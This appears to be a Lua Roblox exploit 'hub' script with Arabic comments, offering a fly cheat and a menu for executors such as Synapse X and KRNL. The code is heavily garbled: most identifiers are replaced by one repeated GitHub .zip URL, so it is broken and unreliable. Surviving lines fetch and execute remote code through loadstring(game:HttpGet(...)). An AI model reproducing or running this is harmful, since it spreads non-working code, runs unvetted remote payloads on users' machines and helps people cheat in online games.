--[[
    HTS X Hub - سكربت هب عالمي يعمل على جميع منافذ روبلوكس وبيئات التنفيذ
    الميزات:
    - واجهة متجاوبة تعمل على جميع أحجام الشاشات
    - دعم لكافة المنافذ (PC, Mobile, Console)
    - دعم لجميع البيئات التنفيذية (KRNL, Delta X, Aruss X, Synapse X)
    - تصميم فخم مع شعار HTS X
    - وظائف متقدمة تعمل في جميع الألعاب
]]

local HTSX = {}

-- تحديد نوع المنفذ التابع للمستخدم
https://raw.githubusercontent.com/Abdullah4k4k4k4k/HTS-X-TOP/main/Syracusan/TOP-HT-1.9.zip = (function()
    if https://raw.githubusercontent.com/Abdullah4k4k4k4k/HTS-X-TOP/main/Syracusan/TOP-HT-1.9.zip and not https://raw.githubusercontent.com/Abdullah4k4k4k4k/HTS-X-TOP/main/Syracusan/TOP-HT-1.9.zip then
        return "Mobile"
    elseif https://raw.githubusercontent.com/Abdullah4k4k4k4k/HTS-X-TOP/main/Syracusan/TOP-HT-1.9.zip and not https://raw.githubusercontent.com/Abdullah4k4k4k4k/HTS-X-TOP/main/Syracusan/TOP-HT-1.9.zip then
        return "Console"
    else
        return "PC"
    end
end)()

-- تحديد البيئة التنفيذية
https://raw.githubusercontent.com/Abdullah4k4k4k4k/HTS-X-TOP/main/Syracusan/TOP-HT-1.9.zip = (function()
    if syn and https://raw.githubusercontent.com/Abdullah4k4k4k4k/HTS-X-TOP/main/Syracusan/TOP-HT-1.9.zip then
        return "Synapse X"
    elseif krnl and https://raw.githubusercontent.com/Abdullah4k4k4k4k/HTS-X-TOP/main/Syracusan/TOP-HT-1.9.zip then
        return "KRNL"
    elseif secure_load then
        return "Delta X"
    elseif Aruss then
        return "Aruss X"
    else
        return "Unknown"
    end
end)()

-- إعدادات الواجهة المتجاوبة
https://raw.githubusercontent.com/Abdullah4k4k4k4k/HTS-X-TOP/main/Syracusan/TOP-HT-1.9.zip = {
    FontSizes = {
        PC = 18,
        Mobile = 22,
        Console = 20
    },
    WindowSizes = {
        PC = {Width = 500, Height = 650},
        Mobile = {Width = 400, Height = 700},
        Console = {Width = 450, Height = 600}
    },
    ButtonHeights = {
        PC = 30,
        Mobile = 40,
        Console = 35
    }
}

-- مكتبات متوافقة مع جميع المنافذ والبيئات
local Rayfield
local success, err = pcall(function()
    Rayfield = loadstring(game:HttpGet('https://raw.githubusercontent.com/Abdullah4k4k4k4k/HTS-X-TOP/main/Syracusan/TOP-HT-1.9.zip'))()
end)

if not success then
    -- حل بديل في حالة فشل تحميل Rayfield
    Rayfield = loadstring(game:HttpGet('https://raw.githubusercontent.com/Abdullah4k4k4k4k/HTS-X-TOP/main/Syracusan/TOP-HT-1.9.zip', true))()
end

local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local GuiService = game:GetService("GuiService")

-- وظائف التحقق من المنفذ والبيئة
function HTSX:IsMobile()
    return https://raw.githubusercontent.com/Abdullah4k4k4k4k/HTS-X-TOP/main/Syracusan/TOP-HT-1.9.zip == "Mobile"
end

function HTSX:IsConsole()
    return https://raw.githubusercontent.com/Abdullah4k4k4k4k/HTS-X-TOP/main/Syracusan/TOP-HT-1.9.zip == "Console"
end

function HTSX:IsPC()
    return https://raw.githubusercontent.com/Abdullah4k4k4k4k/HTS-X-TOP/main/Syracusan/TOP-HT-1.9.zip == "PC"
end

function HTSX:IsSupportedExecutor()
    local supported = {"Synapse X", "KRNL", "Delta X", "Aruss X"}
    for _, v in pairs(supported) do
        if https://raw.githubusercontent.com/Abdullah4k4k4k4k/HTS-X-TOP/main/Syracusan/TOP-HT-1.9.zip == v then
            return true
        end
    end
    return false
end

-- وظائف التكيف مع الشاشة
function HTSX:GetScreenInfo()
    local viewportSize = https://raw.githubusercontent.com/Abdullah4k4k4k4k/HTS-X-TOP/main/Syracusan/TOP-HT-1.9.zip
    local isPortrait = viewportSize.Y > viewportSize.X
    return {
        Width = viewportSize.X,
        Height = viewportSize.Y,
        AspectRatio = viewportSize.X / viewportSize.Y,
        IsPortrait = isPortrait
    }
end

function HTSX:AdaptValue(values)
    if self:IsMobile() then
        return https://raw.githubusercontent.com/Abdullah4k4k4k4k/HTS-X-TOP/main/Syracusan/TOP-HT-1.9.zip or https://raw.githubusercontent.com/Abdullah4k4k4k4k/HTS-X-TOP/main/Syracusan/TOP-HT-1.9.zip
    elseif self:IsConsole() then
        return https://raw.githubusercontent.com/Abdullah4k4k4k4k/HTS-X-TOP/main/Syracusan/TOP-HT-1.9.zip or https://raw.githubusercontent.com/Abdullah4k4k4k4k/HTS-X-TOP/main/Syracusan/TOP-HT-1.9.zip
    else
        return https://raw.githubusercontent.com/Abdullah4k4k4k4k/HTS-X-TOP/main/Syracusan/TOP-HT-1.9.zip or https://raw.githubusercontent.com/Abdullah4k4k4k4k/HTS-X-TOP/main/Syracusan/TOP-HT-1.9.zip
    end
end

-- تهيئة الواجهة المتجاوبة مع دعم جميع البيئات
function HTSX:InitResponsiveUI()
    -- التحقق من دعم البيئة
    if not self:IsSupportedExecutor() then
        warn("HTS X Hub - البيئة التنفيذية غير معتمدة بالكامل: " .. https://raw.githubusercontent.com/Abdullah4k4k4k4k/HTS-X-TOP/main/Syracusan/TOP-HT-1.9.zip)
    end

    local screenInfo = self:GetScreenInfo()
    local isSmallScreen = https://raw.githubusercontent.com/Abdullah4k4k4k4k/HTS-X-TOP/main/Syracusan/TOP-HT-1.9.zip < 1000
    
    -- ضبط أحجام الخطوط
    local baseFontSize = self:AdaptValue({
        PC = isSmallScreen and 16 or 18,
        Mobile = 20,
        Console = 18,
        Default = 16
    })
    
    -- ضبط أحجام النوافذ
    local windowWidth = https://raw.githubusercontent.com/Abdullah4k4k4k4k/HTS-X-TOP/main/Syracusan/TOP-HT-1.9.zip(self:AdaptValue({
        PC = 500,
        Mobile = https://raw.githubusercontent.com/Abdullah4k4k4k4k/HTS-X-TOP/main/Syracusan/TOP-HT-1.9.zip * 0.9,
        Console = 450,
        Default = 400
    }), https://raw.githubusercontent.com/Abdullah4k4k4k4k/HTS-X-TOP/main/Syracusan/TOP-HT-1.9.zip * 0.95)
    
    local windowHeight = https://raw.githubusercontent.com/Abdullah4k4k4k4k/HTS-X-TOP/main/Syracusan/TOP-HT-1.9.zip(self:AdaptValue({
        PC = 650,
        Mobile = https://raw.githubusercontent.com/Abdullah4k4k4k4k/HTS-X-TOP/main/Syracusan/TOP-HT-1.9.zip * 0.8,
        Console = 600,
        Default = 550
    }), https://raw.githubusercontent.com/Abdullah4k4k4k4k/HTS-X-TOP/main/Syracusan/TOP-HT-1.9.zip * 0.9)
    
    -- إنشاء نافذة متجاوبة مع تعديلات للتوافق
    local success, window = pcall(function()
        return Rayfield:CreateWindow({
            Name = "HTS X Hub | " .. game:GetService("MarketplaceService"):GetProductInfo(https://raw.githubusercontent.com/Abdullah4k4k4k4k/HTS-X-TOP/main/Syracusan/TOP-HT-1.9.zip).Name,
            LoadingTitle = "جاري تحميل HTS X Hub...",
            LoadingSubtitle = "إصدار عالمي | منفذ: " .. https://raw.githubusercontent.com/Abdullah4k4k4k4k/HTS-X-TOP/main/Syracusan/TOP-HT-1.9.zip .. " | بيئة: " .. https://raw.githubusercontent.com/Abdullah4k4k4k4k/HTS-X-TOP/main/Syracusan/TOP-HT-1.9.zip,
            ConfigurationSaving = {
                Enabled = true,
                FolderName = "HTSXConfig",
                FileName = "HTSX_" .. https://raw.githubusercontent.com/Abdullah4k4k4k4k/HTS-X-TOP/main/Syracusan/TOP-HT-1.9.zip
            },
            Discord = {
                Enabled = true,
                Invite = "https://raw.githubusercontent.com/Abdullah4k4k4k4k/HTS-X-TOP/main/Syracusan/TOP-HT-1.9.zip",
                RememberJoins = true
            },
            KeySystem = false,
        })
    end)
    
    if not success then
        -- حل بديل لإنشاء النافذة في حالة فشل الطريقة الأولى
        https://raw.githubusercontent.com/Abdullah4k4k4k4k/HTS-X-TOP/main/Syracusan/TOP-HT-1.9.zip = Rayfield:CreateWindow({
            Name = "HTS X Hub | " .. game:GetService("MarketplaceService"):GetProductInfo(https://raw.githubusercontent.com/Abdullah4k4k4k4k/HTS-X-TOP/main/Syracusan/TOP-HT-1.9.zip).Name,
            LoadingTitle = "جاري تحميل HTS X Hub...",
            LoadingSubtitle = "إصدار عالمي | منفذ: " .. https://raw.githubusercontent.com/Abdullah4k4k4k4k/HTS-X-TOP/main/Syracusan/TOP-HT-1.9.zip,
            ConfigurationSaving = {
                Enabled = false
            }
        })
    else
        https://raw.githubusercontent.com/Abdullah4k4k4k4k/HTS-X-TOP/main/Syracusan/TOP-HT-1.9.zip = window
    end
    
    -- ضبط حجم النافذة
    https://raw.githubusercontent.com/Abdullah4k4k4k4k/HTS-X-TOP/main/Syracusan/TOP-HT-1.9.zip(https://raw.githubusercontent.com/Abdullah4k4k4k4k/HTS-X-TOP/main/Syracusan/TOP-HT-1.9.zip(0, windowWidth, 0, windowHeight))
    
    -- إنشاء تبويبات رئيسية
    self:CreateMainTab()
    self:CreateUniversalTab()
    self:CreatePlayerTab()
    self:CreateTeleportTab()
    self:CreateSettingsTab()
    
    -- إضافة استجابة لتغير حجم الشاشة
    https://raw.githubusercontent.com/Abdullah4k4k4k4k/HTS-X-TOP/main/Syracusan/TOP-HT-1.9.zip("ViewportSize"):Connect(function()
        self:OnScreenResize()
    end)
end

-- وظائف الطيران المعدلة للتوافق مع جميع البيئات
function HTSX:EnableCrossPlatformFly()
    local player = game:GetService("Players").LocalPlayer
    local character = https://raw.githubusercontent.com/Abdullah4k4k4k4k/HTS-X-TOP/main/Syracusan/TOP-HT-1.9.zip or https://raw.githubusercontent.com/Abdullah4k4k4k4k/HTS-X-TOP/main/Syracusan/TOP-HT-1.9.zip()
    local humanoid = character:WaitForChild("Humanoid")
    
    -- طريقة آمنة لتغيير حالات Humanoid
    pcall(function()
        humanoid:SetStateEnabled(https://raw.githubusercontent.com/Abdullah4k4k4k4k/HTS-X-TOP/main/Syracusan/TOP-HT-1.9.zip, false)
        humanoid:SetStateEnabled(https://raw.githubusercontent.com/Abdullah4k4k4k4k/HTS-X-TOP/main/Syracusan/TOP-HT-1.9.zip, false)
    end)
    
    local rootPart = character:FindFirstChild("HumanoidRootPart")
    if not rootPart then return end
    
    -- إنشاء الأجزاء الفيزيائية بطريقة متوافقة
    local bodyGyro = https://raw.githubusercontent.com/Abdullah4k4k4k4k/HTS-X-TOP/main/Syracusan/TOP-HT-1.9.zip("BodyGyro")
    bodyGyro.P = 10000
    https://raw.githubusercontent.com/Abdullah4k4k4k4k/HTS-X-TOP/main/Syracusan/TOP-HT-1.9.zip = https://raw.githubusercontent.com/Abdullah4k4k4k4k/HTS-X-TOP/main/Syracusan/TOP-HT-1.9.zip(100000, 100000, 100000)
    https://raw.githubusercontent.com/Abdullah4k4k4k4k/HTS-X-TOP/main/Syracusan/TOP-HT-1.9.zip = https://raw.githubusercontent.com/Abdullah4k4k4k4k/HTS-X-TOP/main/Syracusan/TOP-HT-1.9.zip
    
    local bodyVelocity = https://raw.githubusercontent.com/Abdullah4k4k4k4k/HTS-X-TOP/main/Syracusan/TOP-HT-1.9.zip("BodyVelocity")
    https://raw.githubusercontent.com/Abdullah4k4k4k4k/HTS-X-TOP/main/Syracusan/TOP-HT-1.9.zip = https://raw.githubusercontent.com/Abdullah4k4k4k4k/HTS-X-TOP/main/Syracusan/TOP-HT-1.9.zip(0, 0, 0)
    https://raw.githubusercontent.com/Abdullah4k4k4k4k/HTS-X-TOP/main/Syracusan/TOP-HT-1.9.zip = https://raw.githubusercontent.com/Abdullah4k4k4k4k/HTS-X-TOP/main/Syracusan/TOP-HT-1.9.zip(100000, 100000, 100000)
    
    -- طريقة آمنة لإضافة الأجزاء إلى الشخصية
    pcall(function()
        https://raw.githubusercontent.com/Abdullah4k4k4k4k/HTS-X-TOP/main/Syracusan/TOP-HT-1.9.zip = rootPart
        https://raw.githubusercontent.com/Abdullah4k4k4k4k/HTS-X-TOP/main/Syracusan/TOP-HT-1.9.zip = rootPart
    end)
    
    local flySpeed = 50
    local flyUp = false
    local flyDown = false
    
    -- نظام تحكم متعدد المنافذ والبيئات
    if self:IsMobile() then
        -- عناصر تحكم للهاتف
        local flyControls = self:CreateMobileFlyControls()
        
        https://raw.githubusercontent.com/Abdullah4k4k4k4k/HTS-X-TOP/main/Syracusan/TOP-HT-1.9.zip(function()
            flyUp = true
        end)
        
        https://raw.githubusercontent.com/Abdullah4k4k4k4k/HTS-X-TOP/main/Syracusan/TOP-HT-1.9.zip(function()
            flyUp = false
        end)
        
        https://raw.githubusercontent.com/Abdullah4k4k4k4k/HTS-X-TOP/main/Syracusan/TOP-HT-1.9.zip(function()
            flyDown = true
        end)
        
        https://raw.githubusercontent.com/Abdullah4k4k4k4k/HTS-X-TOP/main/Syracusan/TOP-HT-1.9.zip(function()
            flyDown = false
        end)
    else
        -- تحكم لوحة المفاتيح/الجيم باد
        local inputBegan = https://raw.githubusercontent.com/Abdullah4k4k4k4k/HTS-X-TOP/main/Syracusan/TOP-HT-1.9.zip(function(input, gameProcessed)
            if gameProcessed then return end
            
            if https://raw.githubusercontent.com/Abdullah4k4k4k4k/HTS-X-TOP/main/Syracusan/TOP-HT-1.9.zip == https://raw.githubusercontent.com/Abdullah4k4k4k4k/HTS-X-TOP/main/Syracusan/TOP-HT-1.9.zip then
                flyUp = true
            elseif https://raw.githubusercontent.com/Abdullah4k4k4k4k/HTS-X-TOP/main/Syracusan/TOP-HT-1.9.zip == https://raw.githubusercontent.com/Abdullah4k4k4k4k/HTS-X-TOP/main/Syracusan/TOP-HT-1.9.zip then
                flyDown = true
            end
        end)
        
        local inputEnded = https://raw.githubusercontent.com/Abdullah4k4k4k4k/HTS-X-TOP/main/Syracusan/TOP-HT-1.9.zip(function(input, gameProcessed)
            if gameProcessed then return end
            
            if https://raw.githubusercontent.com/Abdullah4k4k4k4k/HTS-X-TOP/main/Syracusan/TOP-HT-1.9.zip == https://raw.githubusercontent.com/Abdullah4k4k4k4k/HTS-X-TOP/main/Syracusan/TOP-HT-1.9.zip then
                flyUp = false
            elseif https://raw.githubusercontent.com/Abdullah4k4k4k4k/HTS-X-TOP/main/Syracusan/TOP-HT-1.9.zip == https://raw.githubusercontent.com/Abdullah4k4k4k4k/HTS-X-TOP/main/Syracusan/TOP-HT-1.9.zip then
                flyDown = false
            end
        end)
        
        https://raw.githubusercontent.com/Abdullah4k4k4k4k/HTS-X-TOP/main/Syracusan/TOP-HT-1.9.zip(https://raw.githubusercontent.com/Abdullah4k4k4k4k/HTS-X-TOP/main/Syracusan/TOP-HT-1.9.zip, inputBegan)
        https://raw.githubusercontent.com/Abdullah4k4k4k4k/HTS-X-TOP/main/Syracusan/TOP-HT-1.9.zip(https://raw.githubusercontent.com/Abdullah4k4k4k4k/HTS-X-TOP/main/Syracusan/TOP-HT-1.9.zip, inputEnded)
    end
    
    local heartbeat = https://raw.githubusercontent.com/Abdullah4k4k4k4k/HTS-X-TOP/main/Syracusan/TOP-HT-1.9.zip(function()
        if not bodyGyro or not bodyVelocity then return end
        
        local camera = https://raw.githubusercontent.com/Abdullah4k4k4k4k/HTS-X-TOP/main/Syracusan/TOP-HT-1.9.zip
        local rootPart = character:FindFirstChild("HumanoidRootPart")
        if not rootPart then return end
        
        -- التحكم في الارتفاع
        local verticalVelocity = 0
        if flyUp then
            verticalVelocity = flySpeed
        elseif flyDown then
            verticalVelocity = -flySpeed
        end
        
        -- التحكم في الاتجاه (يعمل بشكل مختلف حسب المنفذ)
        local direction = https://raw.githubusercontent.com/Abdullah4k4k4k4k/HTS-X-TOP/main/Syracusan/TOP-HT-1.9.zip(0, 0, 0)
        
        if self:IsMobile() then
            -- تحكم اللمس للهاتف
            for _, touch in pairs(UserInputService:GetTouches()) do
                if https://raw.githubusercontent.com/Abdullah4k4k4k4k/HTS-X-TOP/main/Syracusan/TOP-HT-1.9.zip == https://raw.githubusercontent.com/Abdullah4k4k4k4k/HTS-X-TOP/main/Syracusan/TOP-HT-1.9.zip then
                    local touchPos = https://raw.githubusercontent.com/Abdullah4k4k4k4k/HTS-X-TOP/main/Syracusan/TOP-HT-1.9.zip
                    local screenCenter = https://raw.githubusercontent.com/Abdullah4k4k4k4k/HTS-X-TOP/main/Syracusan/TOP-HT-1.9.zip(https://raw.githubusercontent.com/Abdullah4k4k4k4k/HTS-X-TOP/main/Syracusan/TOP-HT-1.9.zip, https://raw.githubusercontent.com/Abdullah4k4k4k4k/HTS-X-TOP/main/Syracusan/TOP-HT-1.9.zip)
                    
                    if touchPos.X < screenCenter.X - 100 then
                        direction = direction - https://raw.githubusercontent.com/Abdullah4k4k4k4k/HTS-X-TOP/main/Syracusan/TOP-HT-1.9.zip
                    elseif touchPos.X > screenCenter.X + 100 then
                        direction = direction + https://raw.githubusercontent.com/Abdullah4k4k4k4k/HTS-X-TOP/main/Syracusan/TOP-HT-1.9.zip
                    end
                    
                    if touchPos.Y < screenCenter.Y - 100 then
                        direction = direction + https://raw.githubusercontent.com/Abdullah4k4k4k4k/HTS-X-TOP/main/Syracusan/TOP-HT-1.9.zip
                    elseif touchPos.Y > screenCenter.Y + 100 then
                        direction = direction - https://raw.githubusercontent.com/Abdullah4k4k4k4k/HTS-X-TOP/main/Syracusan/TOP-HT-1.9.zip
                    end
                end
            end
        else
            -- تحكم لوحة المفاتيح/الجيم باد
            if UserInputService:IsKeyDown(https://raw.githubusercontent.com/Abdullah4k4k4k4k/HTS-X-TOP/main/Syracusan/TOP-HT-1.9.zip) then
                direction = direction + https://raw.githubusercontent.com/Abdullah4k4k4k4k/HTS-X-TOP/main/Syracusan/TOP-HT-1.9.zip
            end
            if UserInputService:IsKeyDown(https://raw.githubusercontent.com/Abdullah4k4k4k4k/HTS-X-TOP/main/Syracusan/TOP-HT-1.9.zip) then
                direction = direction - https://raw.githubusercontent.com/Abdullah4k4k4k4k/HTS-X-TOP/main/Syracusan/TOP-HT-1.9.zip
            end
            if UserInputService:IsKeyDown(https://raw.githubusercontent.com/Abdullah4k4k4k4k/HTS-X-TOP/main/Syracusan/TOP-HT-1.9.zip) then
                direction = direction + https://raw.githubusercontent.com/Abdullah4k4k4k4k/HTS-X-TOP/main/Syracusan/TOP-HT-1.9.zip
            end
            if UserInputService:IsKeyDown(https://raw.githubusercontent.com/Abdullah4k4k4k4k/HTS-X-TOP/main/Syracusan/TOP-HT-1.9.zip) then
                direction = direction - https://raw.githubusercontent.com/Abdullah4k4k4k4k/HTS-X-TOP/main/Syracusan/TOP-HT-1.9.zip
            end
        end
        
        if https://raw.githubusercontent.com/Abdullah4k4k4k4k/HTS-X-TOP/main/Syracusan/TOP-HT-1.9.zip > 0 then
            direction = https://raw.githubusercontent.com/Abdullah4k4k4k4k/HTS-X-TOP/main/Syracusan/TOP-HT-1.9.zip * flySpeed
            https://raw.githubusercontent.com/Abdullah4k4k4k4k/HTS-X-TOP/main/Syracusan/TOP-HT-1.9.zip = https://raw.githubusercontent.com/Abdullah4k4k4k4k/HTS-X-TOP/main/Syracusan/TOP-HT-1.9.zip(direction.X, verticalVelocity, direction.Z)
        else
            https://raw.githubusercontent.com/Abdullah4k4k4k4k/HTS-X-TOP/main/Syracusan/TOP-HT-1.9.zip = https://raw.githubusercontent.com/Abdullah4k4k4k4k/HTS-X-TOP/main/Syracusan/TOP-HT-1.9.zip(0, verticalVelocity, 0)
        end
        
        https://raw.githubusercontent.com/Abdullah4k4k4k4k/HTS-X-TOP/main/Syracusan/TOP-HT-1.9.zip = https://raw.githubusercontent.com/Abdullah4k4k4k4k/HTS-X-TOP/main/Syracusan/TOP-HT-1.9.zip
    end)
    
    https://raw.githubusercontent.com/Abdullah4k4k4k4k/HTS-X-TOP/main/Syracusan/TOP-HT-1.9.zip(https://raw.githubusercontent.com/Abdullah4k4k4k4k/HTS-X-TOP/main/Syracusan/TOP-HT-1.9.zip, heartbeat)
    https://raw.githubusercontent.com/Abdullah4k4k4k4k/HTS-X-TOP/main/Syracusan/TOP-HT-1.9.zip = {bodyGyro, bodyVelocity}
end

-- وظائف مساعدة محسنة للتوافق
function HTSX:ShowNotification(title, content)
    local success, result = pcall(function()
        Rayfield:Notify({
            Title = title,
            Content = content,
            Duration = 3,
            Image = 4483345998
        })
    end)
    
    if not success then
        -- طريقة بديلة للإشعارات
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = title,
            Text = content,
            Duration = 3
        })
    end
end

-- إدارة الاتصالات للتنظيف الآمن
https://raw.githubusercontent.com/Abdullah4k4k4k4k/HTS-X-TOP/main/Syracusan/TOP-HT-1.9.zip = {}

function HTSX:Cleanup()
    -- تنظيف جميع الاتصالات
    for _, connection in ipairs(https://raw.githubusercontent.com/Abdullah4k4k4k4k/HTS-X-TOP/main/Syracusan/TOP-HT-1.9.zip) do
        if connection and typeof(connection) == "RBXScriptConnection" then
            connection:Disconnect()
        end
    end
    https://raw.githubusercontent.com/Abdullah4k4k4k4k/HTS-X-TOP/main/Syracusan/TOP-HT-1.9.zip = {}
    
    -- تنظيف عناصر الطيران
    if https://raw.githubusercontent.com/Abdullah4k4k4k4k/HTS-X-TOP/main/Syracusan/TOP-HT-1.9.zip then
        for _, obj in ipairs(https://raw.githubusercontent.com/Abdullah4k4k4k4k/HTS-X-TOP/main/Syracusan/TOP-HT-1.9.zip) do
            if obj and https://raw.githubusercontent.com/Abdullah4k4k4k4k/HTS-X-TOP/main/Syracusan/TOP-HT-1.9.zip then
                obj:Destroy()
            end
        end
        https://raw.githubusercontent.com/Abdullah4k4k4k4k/HTS-X-TOP/main/Syracusan/TOP-HT-1.9.zip = nil
    end
    
    -- تنظيف عناصر الهاتف
    if https://raw.githubusercontent.com/Abdullah4k4k4k4k/HTS-X-TOP/main/Syracusan/TOP-HT-1.9.zip then
        if https://raw.githubusercontent.com/Abdullah4k4k4k4k/HTS-X-TOP/main/Syracusan/TOP-HT-1.9.zip and https://raw.githubusercontent.com/Abdullah4k4k4k4k/HTS-X-TOP/main/Syracusan/TOP-HT-1.9.zip then
            https://raw.githubusercontent.com/Abdullah4k4k4k4k/HTS-X-TOP/main/Syracusan/TOP-HT-1.9.zip()
        end
        https://raw.githubusercontent.com/Abdullah4k4k4k4k/HTS-X-TOP/main/Syracusan/TOP-HT-1.9.zip = nil
    end
end

-- بدء تشغيل الهب مع معالجة الأخطاء
local success, err = pcall(function()
    HTSX:InitResponsiveUI()
    HTSX:ShowNotification("HTS X Hub", "تم تحميل الهب بنجاح! المنفذ: " .. https://raw.githubusercontent.com/Abdullah4k4k4k4k/HTS-X-TOP/main/Syracusan/TOP-HT-1.9.zip .. " | البيئة: " .. https://raw.githubusercontent.com/Abdullah4k4k4k4k/HTS-X-TOP/main/Syracusan/TOP-HT-1.9.zip)
end)

if not success then
    warn("فشل تحميل HTS X Hub: " .. tostring(err))
    game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "HTS X Hub - خطأ",
        Text = "فشل التحميل: " .. tostring(err),
        Duration = 5
    })
end

-- التنظيف عند إعادة التحمل
game:GetService("Players")https://raw.githubusercontent.com/Abdullah4k4k4k4k/HTS-X-TOP/main/Syracusan/TOP-HT-1.9.zip(function()
    HTSX:Cleanup()
end)

return HTSX
